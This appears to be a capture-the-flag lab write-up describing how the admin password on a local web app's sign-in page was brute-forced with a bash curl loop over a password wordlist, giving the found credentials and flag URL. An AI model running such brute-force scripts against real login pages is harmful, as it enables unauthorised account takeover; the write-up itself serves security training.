# Brute force the sign in?

## Summary

page: `http://localhost:8081/index.php?page=signin`
commands:
```bash
curl "http://localhost:8081/index.php?page=signin&username=admin&password=shadow&Login=Login"
```
Credentials: `admin` / `shadow` (brute-forced).

## Details

on the sign in page

Used "admin" as the username
to brute force the password... with this script
```bash
#!/bin/bash
while IFS= read -r pass; do
  result=$(curl -s "http://localhost:8081/index.php?page=signin&username=admin&password=$pass&Login=Login")
  if echo "$result" | grep -qi "flag"; then
    echo "FOUND: $pass"
    echo "$result" | grep -i flag
    break
  fi
done < Most-Popular-Letter-Passes.txt

```

So i got the flag:
```
http://localhost:8081/index.php?page=signin&username=admin&password=shadow&Login=Login#
```